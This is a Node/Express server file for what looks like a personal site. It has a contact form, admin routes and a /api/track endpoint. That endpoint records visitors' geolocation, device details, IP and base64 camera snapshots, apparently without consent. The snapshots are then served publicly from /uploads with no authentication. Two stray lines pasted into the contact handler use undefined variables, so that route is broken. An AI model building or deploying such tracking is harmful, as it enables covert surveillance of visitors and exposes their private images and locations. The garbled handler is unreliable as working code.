import express from 'express';
import cors from 'cors';
import dotenv from 'dotenv';
import helmet from 'helmet';
import rateLimit from 'express-rate-limit';
import fs from 'fs/promises';
import path from 'path';
import { fileURLToPath } from 'url';

dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 5000;
const BASE_URL = process.env.BASE_URL || `http://localhost:${PORT}`;

// Security middleware
app.use(helmet());
app.use(cors({
  origin: process.env.NODE_ENV === 'production' 
    ? ['https://yourdomain.com'] 
    : ['http://localhost:5173', 'http://localhost:3000']
}));

// Rate limiting
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100 // limit each IP to 100 requests per windowMs
});
app.use(limiter);

// Contact form rate limiting (more restrictive)
const contactLimiter = rateLimit({
  windowMs: 60 * 60 * 1000, // 1 hour
  max: 5 // limit each IP to 5 contact form submissions per hour
});

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));

// Ensure data directory exists
const dataDir = path.join(__dirname, 'data');
try {
  await fs.access(dataDir);
} catch {
  await fs.mkdir(dataDir, { recursive: true });
}

// Ensure uploads directory exists
const uploadsDir = path.join(__dirname, 'uploads');

// Ensure uploads directory exists
try {
  await fs.access(uploadsDir);
} catch {
  await fs.mkdir(uploadsDir, { recursive: true });
}

// Serve uploads folder statically for image access
app.use('/uploads', (req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
  res.header("Access-Control-Allow-Methods", "GET");
  res.header("Cache-Control", "no-store, no-cache, must-revalidate, proxy-revalidate");
  res.header("Pragma", "no-cache");
  res.header("Expires", "0");
  next();
}, express.static(uploadsDir));
console.log('Uploads directory:', uploadsDir);

// Contact form endpoint
app.post('/api/contact', contactLimiter, async (req, res) => {
  try {
    const { name, email, subject, message } = req.body;
    
    // Basic validation
    if (!name || !email || !subject || !message) {
      return res.status(400).json({ 
        success: false, 
        error: 'All fields are required' 
      });
    }

    // Email validation
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
      return res.status(400).json({ 
        success: false, 
        error: 'Invalid email format' 
      });
    }

    // Store contact submission
    const contactData = {
      id: Date.now().toString(),
      name,
      email,
      subject,
      message,
      timestamp: new Date().toISOString(),
      ip: req.ip
    };

    // Load existing contacts
    let contacts = [];
    try {
      const contactsFile = path.join(dataDir, 'contacts.json');
      const data = await fs.readFile(contactsFile, 'utf8');
      contacts = JSON.parse(data);
    } catch (error) {
      // File doesn't exist yet, start with empty array
    }
await fs.writeFile(filePath, base64Data, 'base64');
console.log('Saved snapshot image at:', filePath);
    contacts.push(contactData);

    // Save contacts
    await fs.writeFile(
      path.join(dataDir, 'contacts.json'),
      JSON.stringify(contacts, null, 2)
    );

    res.json({ 
      success: true, 
      message: 'Thank you for your message! I\'ll get back to you soon.' 
    });

  } catch (error) {
    console.error('Contact form error:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Internal server error' 
    });
  }
});

// Admin authentication middleware
const authenticateAdmin = (req, res, next) => {
  const authHeader = req.headers.authorization;
  const token = authHeader && authHeader.split(' ')[1];

  if (!token || token !== process.env.ADMIN_TOKEN) {
    return res.status(401).json({ error: 'Unauthorized' });
  }

  next();
};

// Tracking data endpoint
// Tracking data endpoint
app.post('/api/track', async (req, res) => {
  try {
    const { latitude, longitude, userAgent, screen, language, image } = req.body;

    const metadata = {
      id: Date.now().toString(),
      latitude,
      longitude,
      userAgent,
      screen,
      language,
      imagePath: '', // will be set if image is saved
      timestamp: new Date().toISOString(),
      ip: req.ip
    };

    // Save image if provided
    if (image && image.startsWith('data:image/')) {
      // Extract file extension
      try {
    const match = image.match(/^data:image\/(\w+);base64,/);
    const extension = match ? match[1] : 'png';
    const filename = `snapshot_${Date.now()}.${extension}`;
    const filePath = path.join(uploadsDir, filename);
    
    const base64Data = image.replace(/^data:image\/\w+;base64,/, '');
    await fs.writeFile(filePath, base64Data, 'base64');
    
    // Verify the file was written
    const stats = await fs.stat(filePath);
    console.log(`Image saved: ${filename}, Size: ${stats.size} bytes`);
    
    metadata.imagePath = `/uploads/${filename}`;
  } catch (err) {
    console.error('Error saving image:', err);
  }
    }

    // Save to tracking logs
    const logFile = path.join(dataDir, 'track.json');
    let logs = [];
    try {
      const data = await fs.readFile(logFile, 'utf8');
      logs = JSON.parse(data);
    } catch {}

    logs.push(metadata);
    await fs.writeFile(logFile, JSON.stringify(logs, null, 2));

    res.json({ success: true, message: 'Tracking data received.' });
  } catch (err) {
    console.error('Tracking error:', err);
    res.status(500).json({ success: false, error: 'Server error' });
  }
});


// Admin route to view contact submissions
app.get('/api/admin/contacts', authenticateAdmin, async (req, res) => {
  try {
    const contactsFile = path.join(dataDir, 'contacts.json');
    const data = await fs.readFile(contactsFile, 'utf8');
    const contacts = JSON.parse(data);
    
    res.json({ 
      success: true, 
      contacts: contacts.reverse() // Most recent first
    });
  } catch (error) {
    if (error.code === 'ENOENT') {
      res.json({ success: true, contacts: [] });
    } else {
      console.error('Admin contacts error:', error);
      res.status(500).json({ error: 'Internal server error' });
    }
  }
});

// Admin route to view tracking data
app.get('/api/admin/tracking', authenticateAdmin, async (req, res) => {
  try {
    const trackFile = path.join(dataDir, 'track.json');
    const data = await fs.readFile(trackFile, 'utf8');
    const trackingLogs = JSON.parse(data);

    res.json({
      success: true,
      tracking: trackingLogs.reverse() // Most recent first
    });
  } catch (error) {
    if (error.code === 'ENOENT') {
      res.json({ success: true, tracking: [] });
    } else {
      console.error('Admin tracking error:', error);
      res.status(500).json({ error: 'Internal server error' });
    }
  }
});

// Health check endpoint
app.get('/api/health', (req, res) => {
  res.json({ status: 'OK', timestamp: new Date().toISOString() });
});

// Error handling middleware
app.use((error, req, res, next) => {
  console.error('Server error:', error);
  res.status(500).json({ error: 'Internal server error' });
});

app.listen(PORT, () => {
  console.log(`\n🚀 Server running on ${BASE_URL}`);
  console.log(`\n📊 Admin Endpoints:`);
  console.log(`   ↳ Contacts: ${BASE_URL}/api/admin/contacts`);
  console.log(`   ↳ Tracking: ${BASE_URL}/api/admin/tracking`);
  console.log(`\n💬 Public Endpoint:`);
  console.log(`   ↳ Contact: ${BASE_URL}/api/contact\n`);
});
